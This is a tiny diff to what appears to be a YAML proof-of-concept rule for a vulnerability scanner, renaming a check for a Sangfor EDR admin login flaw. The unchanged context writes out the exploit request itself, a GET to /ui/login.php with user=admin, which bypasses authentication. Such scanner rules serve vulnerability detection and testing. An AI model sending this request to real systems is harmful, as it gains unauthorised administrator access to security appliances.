@@ -1,4 +1,4 @@
-name: poc-yaml-sangfor-edr-admin-login
+name: poc-yaml-sangfor-edr-arbitrary-admin-login
 rules:
   - method: GET
     path: /ui/login.php?user=admin
